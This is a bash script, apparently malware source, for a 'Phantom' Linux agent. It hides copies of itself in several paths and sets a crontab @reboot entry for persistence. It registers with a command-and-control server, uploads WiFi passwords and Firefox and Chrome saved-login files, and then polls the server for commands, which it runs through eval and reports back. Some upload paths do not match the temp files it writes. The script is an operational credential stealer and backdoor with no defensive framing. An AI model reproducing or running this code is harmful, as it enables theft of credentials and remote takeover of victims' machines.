#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# 🔥 PHANTOM LINUX AGENT - v4.1
# Instant essential data collection
# ═══════════════════════════════════════════════════════════════

C2_SERVER="${PHANTOM_C2_SERVER:?PHANTOM_C2_SERVER not set}"
TOKEN_FILE="$HOME/.config/.phantom_token"
HWID_FILE="$HOME/.config/.phantom_hwid"

set -o pipefail
trap 'exit 1' INT TERM

generate_hwid() {
    if [[ -f "$HWID_FILE" ]]; then
        cat "$HWID_FILE"
    else
        local base=""
        [[ -f /etc/machine-id ]] && base=$(cat /etc/machine-id)
        [[ -z "$base" && -f /var/lib/dbus/machine-id ]] && base=$(cat /var/lib/dbus/machine-id)
        [[ -z "$base" ]] && base="$(hostname)-$(uname -m)-$(date +%s)"
        echo -n "$base" | md5sum | cut -c1-16 | tee "$HWID_FILE" 2>/dev/null
    fi
}

replicate_self() {
    local src="$(readlink -f "$0")"
    local dirs=(
        "/tmp/.phantom.sh"
        "$HOME/.local/bin/.system-update.sh"
        "$HOME/.config/.autostart/phantom.sh"
        "/var/tmp/.hidden-agent.sh"
    )
    for dest in "${dirs[@]}"; do
        mkdir -p "$(dirname "$dest")" 2>/dev/null
        cp "$src" "$dest" 2>/dev/null && chmod +x "$dest" 2>/dev/null
    done
    (crontab -l 2>/dev/null; echo "@reboot $src") | crontab - 2>/dev/null
}

register_agent() {
    if [[ ! -f "$TOKEN_FILE" ]]; then
        local hwid=$(generate_hwid)
        local host=$(hostname)
        local body="{\"agent_id\":\"$host-$hwid\",\"hostname\":\"$host\",\"os\":\"Linux\"}"
        local response=$(curl -s -X POST -d "$body" -H "Content-Type: application/json" "$C2_SERVER?action=register")
        local token=$(echo "$response" | jq -r '.token' 2>/dev/null)
        [[ -n "$token" && "$token" != "null" ]] && echo "$token" > "$TOKEN_FILE"
    fi
    AUTH_TOKEN=$(cat "$TOKEN_FILE" 2>/dev/null)
}

# Instant collection and upload
instant_collect() {
    # Hardware info
    {
        echo "=== HARDWARE INFO ==="
        cat /proc/cpuinfo | grep "model name" | head -1
        free -h | grep Mem
        dmidecode -t system 2>/dev/null || true
    } > /tmp/hw_info.txt
    curl -s -X POST -H "X-Agent-Token: $AUTH_TOKEN" -d @"$HOME/hw_info.txt" "$C2_SERVER?action=upload&type=hardware_info" >/dev/null 2>&1
    rm -f /tmp/hw_info.txt

    # WiFi passwords
    {
        echo "=== WIFI PASSWORDS ==="
        if [[ -d /etc/NetworkManager/system-connections ]]; then
            for f in /etc/NetworkManager/system-connections/*; do
                ssid=$(grep -oP 'ssid=\K.*' "$f" 2>/dev/null)
                psk=$(grep -oP 'psk=\K.*' "$f" 2>/dev/null)
                [[ -n "$ssid" && -n "$psk" ]] && echo "SSID: $ssid | Password: $psk"
            done
        fi
        [[ -f /etc/wpa_supplicant/wpa_supplicant.conf ]] && cat /etc/wpa_supplicant/wpa_supplicant.conf
    } > /tmp/wifi_info.txt
    curl -s -X POST -H "X-Agent-Token: $AUTH_TOKEN" -d @"$HOME/wifi_info.txt" "$C2_SERVER?action=upload&type=wifi_passwords" >/dev/null 2>&1
    rm -f /tmp/wifi_info.txt

    # Browser passwords (copy DB files and send base64)
    {
        echo "=== BROWSER PASSWORDS ==="
        # Firefox
        for profile in "$HOME/.mozilla/firefox/"*; do
            if [[ -f "$profile/logins.json" ]]; then
                echo "FIREFOX_JSON_B64:"
                base64 -w0 "$profile/logins.json"
                echo
            fi
        done
        # Chrome
        if [[ -f "$HOME/.config/google-chrome/Default/Login Data" ]]; then
            echo "CHROME_DB_B64:"
            base64 -w0 "$HOME/.config/google-chrome/Default/Login Data"
            echo
        fi
    } > /tmp/browser_info.txt
    curl -s -X POST -H "X-Agent-Token: $AUTH_TOKEN" -d @"$HOME/browser_info.txt" "$C2_SERVER?action=upload&type=browser_passwords" >/dev/null 2>&1
    rm -f /tmp/browser_info.txt
}

main_loop() {
    register_agent
    [[ -z "$AUTH_TOKEN" ]] && exit 1
    export AUTH_TOKEN

    # Run instant collection once at start
    instant_collect

    while true; do
        curl -s -H "X-Agent-Token: $AUTH_TOKEN" \
            "$C2_SERVER?action=heartbeat&hostname=$(hostname)&os=Linux" >/dev/null 2>&1

        local sysinfo="{\"hostname\":\"$(hostname)\",\"username\":\"$USER\",\"os\":\"$(uname -s -r)\",\"hwid\":\"$(generate_hwid)\"}"
        curl -s -X POST -H "X-Agent-Token: $AUTH_TOKEN" -d "$sysinfo" \
            "$C2_SERVER?action=upload&type=system" >/dev/null 2>&1

        local commands=$(curl -s -H "X-Agent-Token: $AUTH_TOKEN" "$C2_SERVER?action=get_commands")
        if [[ "$commands" != "[]" && "$commands" != "" ]]; then
            local count=$(echo "$commands" | jq length 2>/dev/null)
            for ((i=0; i<count; i++)); do
                local cmd=$(echo "$commands" | jq -r ".[$i].command" 2>/dev/null)
                local id=$(echo "$commands" | jq -r ".[$i].id" 2>/dev/null)
                local output=$(eval "$cmd" 2>&1)
                curl -s -X POST -H "X-Agent-Token: $AUTH_TOKEN" -d "$output" \
                    "$C2_SERVER?action=send_output&command_id=$id" >/dev/null 2>&1
            done
        fi

        sleep $(( RANDOM % 180 + 120 ))
    done
}

replicate_self
main_loop